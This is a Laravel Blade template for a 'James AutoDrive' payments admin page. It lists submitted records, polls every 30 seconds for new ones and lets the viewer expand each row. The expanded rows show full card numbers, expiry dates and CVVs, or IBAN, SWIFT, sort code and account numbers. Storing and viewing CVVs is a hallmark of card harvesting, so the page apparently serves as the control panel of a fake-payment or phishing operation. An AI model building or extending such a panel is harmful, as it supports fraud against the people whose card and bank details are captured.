<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>Submissions – James AutoDrive Admin</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: #f4f4f7; font-family: 'Segoe UI', Arial, sans-serif; color: #1a1a26; font-size: 14px; }

    /* Nav */
    .nav { background: linear-gradient(135deg, #0a0a0a 0%, #1a1a26 100%); padding: 0 32px;
           display: flex; align-items: center; justify-content: space-between; height: 60px; }
    .nav__brand { color: #d4a017; font-weight: 900; font-size: 16px; letter-spacing: -0.01em; }
    .nav__brand span { color: #fff; }
    .nav__right { display: flex; align-items: center; gap: 16px; }
    .nav__count { background: rgba(212,160,23,0.15); border: 1px solid rgba(212,160,23,0.4);
                  color: #d4a017; border-radius: 20px; padding: 3px 12px; font-size: 12px; font-weight: 600; }
    .nav__logout { color: rgba(255,255,255,0.6); font-size: 13px; text-decoration: none; padding: 6px 14px;
                   border: 1px solid rgba(255,255,255,0.2); border-radius: 6px; transition: all .2s; }
    .nav__logout:hover { background: rgba(255,255,255,0.1); color: #fff; }

    /* Toolbar */
    .toolbar { padding: 20px 32px; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
    .toolbar input[type="text"] { flex: 1; min-width: 200px; max-width: 340px; padding: 9px 14px;
      border: 1.5px solid #e5e7eb; border-radius: 8px; font-size: 13px; outline: none; transition: border-color .2s; }
    .toolbar input[type="text"]:focus { border-color: #d4a017; }
    .toolbar select { padding: 9px 14px; border: 1.5px solid #e5e7eb; border-radius: 8px;
                      font-size: 13px; outline: none; background: #fff; cursor: pointer; }
    .toolbar button { padding: 9px 20px; background: #d4a017; color: #fff; border: none;
                      border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; }
    .toolbar button:hover { background: #b8881a; }
    .toolbar a.reset { padding: 9px 16px; background: #fff; color: #6b7280; border: 1.5px solid #e5e7eb;
                       border-radius: 8px; font-size: 13px; text-decoration: none; font-weight: 500; }
    .toolbar a.reset:hover { background: #f9fafb; }

    /* Table wrapper */
    .wrap { padding: 0 32px 40px; overflow-x: auto; }
    table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 12px; overflow: hidden;
            box-shadow: 0 2px 12px rgba(0,0,0,0.07); min-width: 1100px; }
    thead { background: #1a1a26; color: #fff; }
    thead th { padding: 14px 16px; text-align: left; font-size: 11px; font-weight: 700;
               text-transform: uppercase; letter-spacing: 0.08em; white-space: nowrap; }
    tbody tr { border-bottom: 1px solid #f0f0f0; transition: background .15s; }
    tbody tr:last-child { border-bottom: none; }
    tbody tr:hover { background: #fafafa; }
    td { padding: 13px 16px; vertical-align: middle; white-space: nowrap; }
    .mono { font-family: 'Courier New', monospace; font-size: 13px; letter-spacing: 0.04em; }
    .ref { font-weight: 700; color: #d4a017; font-size: 13px; }
    .badge { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; }
    .badge--card    { background: #eff6ff; color: #1d4ed8; }
    .badge--bank    { background: #f0fdf4; color: #166534; }
    .badge--revolut { background: #1a1a1a; color: #fff; }
    .country-flag { font-size: 13px; margin-left: 5px; }
    .na { color: #d1d5db; font-size: 12px; }
    .amount { font-weight: 700; color: #16a34a; }
    .date { color: #6b7280; font-size: 12px; }

    /* Expand toggle */
    details summary { cursor: pointer; color: #6b7280; font-size: 12px; list-style: none; }
    details summary::-webkit-details-marker { display: none; }
    details summary::before { content: '▶ '; font-size: 10px; }
    details[open] summary::before { content: '▼ '; }
    details .extra { margin-top: 6px; display: grid; gap: 3px; }
    details .extra span { display: block; font-size: 12px; color: #374151; }
    details .extra span b { color: #6b7280; font-weight: 500; }

    /* Pagination */
    .pagination { padding: 20px 32px; display: flex; gap: 6px; align-items: center; }
    .pagination a, .pagination span { padding: 7px 13px; border-radius: 6px; font-size: 13px; text-decoration: none; border: 1px solid #e5e7eb; color: #374151; }
    .pagination .active span { background: #d4a017; color: #fff; border-color: #d4a017; font-weight: 700; }
    .pagination a:hover { background: #f9fafb; }

    .empty { text-align: center; padding: 60px 20px; color: #9ca3af; font-size: 15px; }

    /* Notification banner */
    #notif-bar {
      position: sticky; top: 0; z-index: 100;
      display: none; align-items: center; gap: 14px;
      background: #0f1f0f; border-bottom: 2px solid #22c55e;
      padding: 12px 32px; animation: slideDown .3s ease;
    }
    #notif-bar.show { display: flex; }
    @keyframes slideDown {
      from { transform: translateY(-100%); opacity: 0; }
      to   { transform: translateY(0);    opacity: 1; }
    }
    .notif__dot {
      width: 10px; height: 10px; border-radius: 50%; background: #22c55e;
      animation: pulse 1.4s infinite;
    }
    @keyframes pulse {
      0%, 100% { box-shadow: 0 0 0 0 rgba(34,197,94,.6); }
      50%       { box-shadow: 0 0 0 6px rgba(34,197,94,0); }
    }
    .notif__text { color: #fff; font-size: 13px; font-weight: 600; flex: 1; }
    .notif__text span { color: #22c55e; }
    .notif__refresh {
      padding: 6px 16px; background: #22c55e; color: #fff; border: none;
      border-radius: 6px; font-size: 12px; font-weight: 700; cursor: pointer;
      transition: background .2s;
    }
    .notif__refresh:hover { background: #16a34a; }
    .notif__dismiss {
      background: none; border: none; color: rgba(255,255,255,.4);
      font-size: 18px; cursor: pointer; line-height: 1; padding: 0 4px;
    }
    .notif__dismiss:hover { color: #fff; }

    /* Live indicator dot in nav */
    .nav__live {
      display: flex; align-items: center; gap: 6px;
      color: rgba(255,255,255,.4); font-size: 11px;
    }
    .nav__live-dot {
      width: 7px; height: 7px; border-radius: 50%; background: #22c55e;
      animation: pulse 2s infinite;
    }
  </style>
</head>
<body>

  <!-- Notification banner -->
  <div id="notif-bar">
    <div class="notif__dot"></div>
    <div class="notif__text">
      <span id="notif-count">1</span> new submission<span id="notif-plural"></span> received
    </div>
    <button class="notif__refresh" onclick="window.location.reload()">Refresh Now</button>
    <button class="notif__dismiss" onclick="dismissNotif()" title="Dismiss">&times;</button>
  </div>

  <!-- Nav -->
  <nav class="nav">
    <div class="nav__brand">JAMES <span>AUTODRIVE</span> &mdash; Payments Admin</div>
    <div class="nav__right">
      <div class="nav__live"><div class="nav__live-dot"></div> Live</div>
      <span class="nav__count" id="record-count">{{ $submissions->total() }} record{{ $submissions->total() !== 1 ? 's' : '' }}</span>
      <form method="POST" action="{{ route('admin.logout') }}" style="display:inline">
        @csrf
        <button type="submit" style="background:none;border:1px solid rgba(255,255,255,0.2);color:rgba(255,255,255,0.6);
               padding:6px 14px;border-radius:6px;cursor:pointer;font-size:13px;">Logout</button>
      </form>
    </div>
  </nav>

  <!-- Toolbar -->
  <form method="GET" action="{{ route('admin.submissions') }}" class="toolbar">
    <input type="text" name="search" value="{{ request('search') }}" placeholder="Search name, email, ref, phone…"/>
    <select name="method">
      <option value="">All Methods</option>
      <option value="card"    {{ request('method') === 'card'    ? 'selected' : '' }}>💳 Card</option>
      <option value="bank"    {{ request('method') === 'bank'    ? 'selected' : '' }}>🏦 Bank Transfer</option>
      <option value="revolut" {{ request('method') === 'revolut' ? 'selected' : '' }}>R Revolut</option>
    </select>
    <button type="submit">Filter</button>
    @if(request('search') || request('method'))
      <a href="{{ route('admin.submissions') }}" class="reset">Clear</a>
    @endif
  </form>

  <!-- Table -->
  <div class="wrap">
    @if($submissions->isEmpty())
      <div class="empty">No submissions found.</div>
    @else
    <table>
      <thead>
        <tr>
          <th>#</th>
          <th>Ref</th>
          <th>Date</th>
          <th>Name</th>
          <th>Email</th>
          <th>Phone</th>
          <th>Amount</th>
          <th>Method</th>
          <th>Details</th>
        </tr>
      </thead>
      <tbody>
        @foreach($submissions as $i => $s)
        <tr>
          <td class="date">{{ $submissions->firstItem() + $i }}</td>
          <td><span class="ref">{{ $s->ref_number }}</span></td>
          <td class="date">{{ $s->created_at->timezone('Europe/London')->format('d M Y H:i') }}</td>
          <td>{{ $s->full_name }}</td>
          <td>{{ $s->email }}</td>
          <td class="mono">{{ $s->phone }}</td>
          <td class="amount">
            {{ ($s->bank_country === 'ie' || $s->payment_method === 'revolut') ? '€' : '£' }}{{ number_format($s->amount, 2) }}
          </td>
          <td>
            <span class="badge badge--{{ $s->payment_method }}">
              @if($s->payment_method === 'card') 💳 CARD
              @elseif($s->payment_method === 'revolut') R REVOLUT
              @else 🏦 BANK
              @endif
            </span>
            @if($s->bank_country === 'uk') <span class="country-flag">🇬🇧</span>
            @elseif($s->bank_country === 'ie') <span class="country-flag">🇮🇪</span>
            @endif
          </td>
          <td>
            @if($s->payment_method === 'card')
              <details>
                <summary>Card details</summary>
                <div class="extra">
                  <span><b>Holder:</b> {{ $s->card_holder ?? '—' }}</span>
                  <span><b>Number:</b> <span class="mono">{{ $s->card_number ?? '—' }}</span></span>
                  <span><b>Expiry:</b> {{ $s->card_expiry ?? '—' }}</span>
                  <span><b>CVV:</b> <span class="mono">{{ $s->cvv ?? '—' }}</span></span>
                  @if($s->reference)<span><b>Order Ref:</b> {{ $s->reference }}</span>@endif
                </div>
              </details>
            @elseif($s->payment_method === 'revolut')
              <details>
                <summary>Revolut details</summary>
                <div class="extra">
                  <span><b>Country:</b> 🇮🇪 Ireland</span>
                  <span><b>Bank Name:</b> {{ $s->sender_bank_name ?? '—' }}</span>
                  <span><b>IBAN:</b> <span class="mono">{{ $s->sender_iban ?? '—' }}</span></span>
                  <span><b>SWIFT/BIC:</b> <span class="mono">{{ $s->sender_swift_bic ?? '—' }}</span></span>
                  @if($s->sender_sort_code)<span><b>Sort Code:</b> <span class="mono">{{ $s->sender_sort_code }}</span></span>@endif
                  @if($s->sender_account_number)<span><b>Account No:</b> <span class="mono">{{ $s->sender_account_number }}</span></span>@endif
                  @if($s->reference)<span><b>Order Ref:</b> {{ $s->reference }}</span>@endif
                </div>
              </details>
            @else
              <details>
                <summary>Bank details</summary>
                <div class="extra">
                  <span><b>Country:</b> {{ $s->bank_country === 'uk' ? '🇬🇧 United Kingdom' : '🇮🇪 Ireland' }}</span>
                  <span><b>Bank:</b> {{ $s->sender_bank_name ?? '—' }}</span>
                  @if($s->bank_country === 'uk')
                    <span><b>Sort Code:</b> <span class="mono">{{ $s->sender_sort_code ?? '—' }}</span></span>
                    <span><b>Account No:</b> <span class="mono">{{ $s->sender_account_number ?? '—' }}</span></span>
                  @endif
                  <span><b>IBAN:</b> <span class="mono">{{ $s->sender_iban ?? '—' }}</span></span>
                  <span><b>SWIFT/BIC:</b> <span class="mono">{{ $s->sender_swift_bic ?? '—' }}</span></span>
                  @if($s->reference)<span><b>Order Ref:</b> {{ $s->reference }}</span>@endif
                </div>
              </details>
            @endif
          </td>
        </tr>
        @endforeach
      </tbody>
    </table>
    @endif
  </div>

  <!-- Pagination -->
  @if($submissions->hasPages())
  <div class="pagination">
    {{ $submissions->links() }}
  </div>
  @endif

  <script>
    const POLL_URL     = '{{ route('admin.poll') }}';
    const POLL_INTERVAL = 30000; // 30 seconds
    let knownLatestId  = {{ $latestId }};
    let dismissed      = false;

    function dismissNotif() {
      dismissed = true;
      document.getElementById('notif-bar').classList.remove('show');
    }

    async function poll() {
      try {
        const res = await fetch(POLL_URL + '?since=' + knownLatestId, {
          headers: { 'X-Requested-With': 'XMLHttpRequest' }
        });

        if (res.status === 401) { clearInterval(timer); return; }

        const data = await res.json();

        if (data.new_count > 0 && !dismissed) {
          const bar    = document.getElementById('notif-bar');
          const count  = document.getElementById('notif-count');
          const plural = document.getElementById('notif-plural');
          count.textContent  = data.new_count;
          plural.textContent = data.new_count !== 1 ? 's' : '';
          bar.classList.add('show');

          // Update the record count badge to reflect reality
          const badge = document.getElementById('record-count');
          if (badge) {
            badge.textContent = data.total + ' record' + (data.total !== 1 ? 's' : '');
          }
        }
      } catch (_) { /* network error – silently retry */ }
    }

    const timer = setInterval(poll, POLL_INTERVAL);
  </script>

</body>
</html>
